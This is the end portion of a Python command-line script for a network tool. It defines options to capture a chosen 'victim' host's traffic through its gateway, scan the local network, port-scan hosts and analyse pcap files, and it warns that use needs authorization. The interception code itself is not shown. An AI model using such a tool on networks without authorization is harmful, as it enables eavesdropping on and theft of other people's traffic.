        --tcpdump --tcpdump-filter 'tcp port 80 or tcp port 443'

  Offline analysis (does not require root):
    python3 npa.py --pcap-input capture.pcap -o results

  Custom output directory:
    sudo python3 npa.py -v 192.168.1.50 -g 192.168.1.1 -i eth0 -o /tmp/captures

  Network scan (requires root):
    sudo python3 npa.py -i eth0 --scan-network
    sudo python3 npa.py -i eth0 --scan-network --port-scan  # With port detection

WARNING: Use only on networks where you have explicit authorization.
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter           # Preserve epilog formatting
    )

    parser.add_argument(
        "-v", "--victim",
        help="IP address of the target (e.g., 192.168.1.100)"
    )

    parser.add_argument(
        "-g", "--gateway",
        help="IP address of the gateway (e.g., 192.168.1.1)"
    )

    parser.add_argument(
        "-i", "--interface",
        help="Network interface (e.g., eth0, wlan0, enp0s3)"
    )

    parser.add_argument(
        "-o", "--output",
        default="captures",
        help="Output directory for captured files (default: captures)"
    )

    parser.add_argument(
        "--cleanup-age",
        type=int,
        default=24,
        help="Age in hours for automatic log cleanup (default: 24)"
    )

    parser.add_argument(
        "--tcpdump",
        action='store_true',
        help="Enable automatic analysis with tcpdump after capture"
    )

    parser.add_argument(
        "--tcpdump-filter",
        help="Custom filter for tcpdump (e.g., 'tcp port 80')"
    )

    parser.add_argument(
        "--pcap-input",
        help="PCAP/CAP file for offline analysis (disables live capture)"
    )

    parser.add_argument(
        "-s", "--scan-network",
        action='store_true',
        help="Scan the local network for active IPs and MAC addresses"
    )

    parser.add_argument(
        "-p", "--port-scan",
        action='store_true',
        help="Perform port scanning on discovered hosts during network scan (scans common TC"
    )

    parser.add_argument(
        "-V", "--version",
        action='version',
        version='%(prog)s 0.20.0'
    )

    parser.add_argument(
        "--list-interfaces",
        action='store_true',
        help="List available network interfaces and exit"
    )

    # Parse arguments
    args = parser.parse_args()

    # Handle network scan
    if args.scan_network:
        if not args.interface:
            parser.error("--interface (-i) is required for network scan")
        if os.geteuid() != 0:
            print("[ERROR] Root privileges required for network scan.")
            sys.exit(1)
        scan_network(args.interface, args.output, port_scan=args.port_scan)
        sys.exit(0)

    # List interfaces
    if args.list_interfaces:
        print("\n[INFO] Available network interfaces:\n")
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            ip = addrs.get(netifaces.AF_INET, [{}])[0].get('addr', 'N/A')
            print(f"  • {iface:15s} IP: {ip}")
        print()
        sys.exit(0)

    # Validate arguments
    if args.pcap_input:
        # Offline mode
        if not os.path.exists(args.pcap_input):
            print(f"[ERROR] PCAP file not found: {args.pcap_input}")
            sys.exit(1)

        print(f"[MODE] Offline Analysis")
        print(f"[FILE] {args.pcap_input}\n")

        # Create analyzer without victim/gateway
        analyzer = NetworkAnalyzer(
            victim=None,
            gateway=None,
            interface=None,
            output_dir=args.output,
            cleanup_age_hours=args.cleanup_age,
            tcpdump_filter=args.tcpdump_filter,
            pcap_input=args.pcap_input
        )

    else:
        # Live mode - validate required parameters
        if not args.victim or not args.gateway or not args.interface:
            print("[ERROR] For live capture, -v, -g, and -i are required")
            print("[HINT] Use --help or (-h)to see usage examples")
            print("[HINT] Use --list-interfaces to see available interfaces")
            sys.exit(1)

        print(f"[MODE] Live Capture")
        print(f"[TARGET] {args.victim}")
        print(f"[GATEWAY] {args.gateway}")
        print(f"[INTERFACE] {args.interface}\n")

        # Create analyzer
        try:
            analyzer = NetworkAnalyzer(
                victim=args.victim,
                gateway=args.gateway,
                interface=args.interface,
                output_dir=args.output,
                cleanup_age_hours=args.cleanup_age,
                tcpdump_filter=args.tcpdump_filter,
                pcap_input=None
            )
        except ValueError as e:
            print(f"[ERROR] {e}")
            sys.exit(1)

    # Execute analysis
    try:
        analyzer.run(enable_tcpdump=args.tcpdump)

    except KeyboardInterrupt:
        print("\n\n[INFO] Program interrupted by user")
        sys.exit(0)

    except Exception as e:
        print(f"\n[ERROR] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()


# ADICIONAR DETECÇÃO DE PORTAS         ✓✓✓✓✓✓✓
# MELHORAR SAÍDA DE SCAN 
# EXPLICAR COMO USAR O SCAN
# aicionar varredura UDP 
# Melhorar detecção de portas
# Tornar scan mais rápido             ✓✓✓✓✓✓✓